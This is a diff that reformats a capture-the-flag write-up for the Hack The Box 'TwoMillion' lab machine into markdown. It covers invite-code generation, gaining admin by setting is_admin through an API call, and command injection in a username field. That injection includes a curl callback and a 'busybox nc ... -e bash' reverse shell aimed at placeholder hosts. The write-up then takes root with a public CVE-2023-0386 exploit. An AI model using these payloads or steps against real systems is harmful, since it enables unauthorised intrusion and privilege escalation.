@@ -52,9 +52,9 @@ register
 ## Gaining Initial Access
 
 While investigating possible entry points, I found a message on /invite:
-
-### “Feel free to hack your way in :)”
-
+``` html
+ “Feel free to hack your way in :)”
+```
 At this point, I assumed that the /invite endpoint needed to be exploited.
 
 I tried registering an account, but it required an invite code.
@@ -62,41 +62,49 @@ I tried registering an account, but it required an invite code.
 ## Invite Code Generation
 
 I revisited /invite and found this JavaScript file:
-
+```bash
 http://2million.htb/js/inviteapi.min.js
-
+```
 The code was obfuscated. After analyzing it, I discovered API endpoints related to invite generation.
 
-Step 1: Request Instructions
+### Step 1: Request Instructions
+``` bash
 curl -X POST http://2million.htb/api/v1/invite/how/to/generate
+```
 Response:
+``` bash
 "data": "Va beqre gb trarengr gur vaivgr pbqr..."
 "enctype": "ROT13"
-
+```
 I used CyberChef to decode the ROT13 message.
 
-Decoded Result:
+### Decoded Result:
 In order to generate the invite code, make a POST request to /api/v1/invite/generate
-Step 2: Generate Invite Code
-curl -X POST http://2million.htb/api/v1/invite/generate
-Response:
-"code": "UzVWT0ctVjFYQzItSldFSkctOUlaRVQ="
 
+Step 2: Generate Invite Code
+``` bash
+curl -X POST http://2million.htb/api/v1/invite/generate
+```
+Response:
+```bash
+"code": "UzVWT0ctVjFYQzItSldFS******"
+```
 This was Base64 encoded, so I decoded it using CyberChef.
 
 Result:
+``` bash
 S5VOG-V1XC2-*********
-
+```
 I used this code on /invite, which allowed me to register an account.
 
-🔎 API Enumeration
+ ### API Enumeration
 
 After logging in, I explored the application and found an endpoint:
-
+``` html
 /api/v1/user/vpn/generate
-
+```
 Using Burp Suite, I discovered the API structure:
-
+``` html
 {
   "admin": {
     "POST": {
@@ -107,126 +115,132 @@ Using Burp Suite, I discovered the API structure:
     }
   }
 }
-🔓 Privilege Escalation (User → Admin)
+```
+## Privilege Escalation (User → Admin)
 
 I targeted:
-
+``` html
 /api/v1/admin/settings/update
-
+```
 I added the header:
-
+``` html
 Content-Type: application/json
-Exploitation Steps
+```
+### Exploitation Steps
 
 1st Attempt:
-
+``` html
 {
   "test": "test"
 }
-
+```
 Response:
-
+``` html
 Missing parameter: email
-
+```
 2nd Attempt:
-
+``` html
 {
   "email": "YOUR_EMAIL"
 }
-
+```
 Response:
-
+``` html
 Missing parameter: is_admin
-
+```
 This indicated that I could potentially control admin privileges.
 
 3rd Attempt:
-
+``` html
 {
   "is_admin": true,
   "email": "YOUR_EMAIL"
 }
-
+```
 Response:
-
+``` html
 Variable is_admin needs to be either 0 or 1
-
+```
 4th Attempt:
-
+``` html
 {
   "is_admin": 1,
   "email": "YOUR_EMAIL"
 }
 ✅ Success:
 "is_admin": 1
-
+```
 I confirmed admin access:
-
+``` html
 /api/v1/admin/auth → true
-💥 Command Injection
+```
 
 I accessed:
-
+``` html
 /api/v1/admin/vpn/generate
-Exploitation Steps
+```
+### Exploitation Steps
 
 1st Attempt:
-
+``` html
 {
   "test": "test"
 }
-
+```
 2nd Attempt:
-
+``` html
 {
   "username": "YOUR_EMAIL"
 }
-
+```
 The hint suggested a command injection vulnerability, so I tested:
 
 3rd Attempt:
-
+``` html
 {
   "username": "YOUR_EMAIL && curl YOUR_IP:PORT"
 }
-✅ It worked!
-Reverse Shell
+```
+It worked!
+
+## Reverse Shell
 
 4th Attempt:
-
+``` html
 {
   "username": "YOUR_EMAIL && busybox nc YOUR_IP PORT -e bash"
 }
-
+```
 Now I successfully gained a shell.
 
-🧑‍💻 User Access
+## User Access
 
 While exploring, I found useful files in:
-
+``` bash
 /var/www/html
-
+```
 I discovered credentials in .env:
-
+``` bash
 DB_USERNAME=admin
 DB_PASSWORD=SuperDuperPass123
-
+```
 Using these credentials, I accessed:
-
+``` bash
 /home/admin/user.txt
-⚙️ Privilege Escalation (Root)
+```
+Privilege Escalation (Root)
 
 I checked the kernel version:
-
+``` bash
 uname -r
-
+```
 Result:
-
+``` bash
 5.15.70-051570-generic
-
+```
 This version is vulnerable to CVE-2023-0386.
 
-🧠 Vulnerability Explanation
+## Vulnerability Explanation
 
 In my understanding:
 
@@ -236,7 +250,7 @@ An attacker can use FUSE to create a fake file with UID 0 and SUID bit set
 
 This makes the file appear as if it is owned by root
 
-Steps:
+### Steps:
 
 Create a namespace to allow mounting without root
 
@@ -244,51 +258,48 @@ Use OverlayFS to layer the malicious file
 
 Trick the kernel into copying the file with elevated privileges
 
-🚀 Exploitation
+## Exploitation
 
 I used a public exploit:
-
+``` html
 https://github.com/sxlmnwb/CVE-2023-0386
+```
 Files:
-exp.c
-fuse.c
-getshell.c
-Makefile
-ovlcap
-README.md
-test
-File Roles:
+- exp.c
+- fuse.c
+- getshell.c
+- Makefile
+- ovlcap
+- README.md
+- test
+### File Roles:
 
-exp.c → Performs privilege escalation
+- exp.c → Performs privilege escalation
 
-fuse.c → Malicious FUSE filesystem
+- fuse.c → Malicious FUSE filesystem
 
-getshell.c → Spawns root shell
+- getshell.c → Spawns root shell
 
-ovlcap → Target file for capability injection
+- ovlcap → Target file for capability injection
 
-Compilation
+## Compilation
+``` bash
 make all
-Execution (2 Terminals Required)
+```
+### Execution (2 Terminals Required)
 
 Terminal 1:
-
+``` bash
 ./fuse ./ovlcap/lower ./gc
-
+```
 Terminal 2:
-
+``` bash
 ./exp
-👑 Root Access
-
+```
 After running the exploit, I successfully gained root access.
 
-📚 Reference
+### Reference for CVE-2023-0386
 
 https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/
 
-If you want, I can also:
-
-Make this more professional (HTB-style writeup)
-
-Or make a shorter version for GitHub portfolio
 
